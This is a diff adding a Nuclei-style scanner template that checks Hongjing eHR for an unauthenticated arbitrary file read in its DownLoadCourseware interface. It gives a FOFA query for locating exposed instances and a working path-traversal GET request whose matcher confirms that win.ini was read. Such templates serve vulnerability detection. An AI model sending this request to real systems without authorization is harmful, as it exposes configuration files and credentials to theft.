@@ -1,0 +1,36 @@
+id: hongjingeHR-DownLoadCourseware-File-reading
+
+info:
+  name: 宏景eHR DownLoadCourseware 任意文件读取漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: app="HJSOFT-HCM"
+    宏景eHR DownLoadCourseware 接口处存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+  reference:
+    - https://blog.csdn.net/m0_60571842/article/details/140248160
+  tags: File reading
+
+
+
+http:
+  - raw:
+      - |
+        GET /w_selfservice/oauthservlet/%2e./.%2e/DownLoadCourseware?url=VHmj0PAATTP2HJBPAATTPcyRcHb6hPAATTP2HJFPAATTP59XObqwUZaPAATTP2HJBPAATTP6EvXjT HTTP/1.1
+        Host: {{Hostname}}
+  
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '; for 16-bit app support'
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
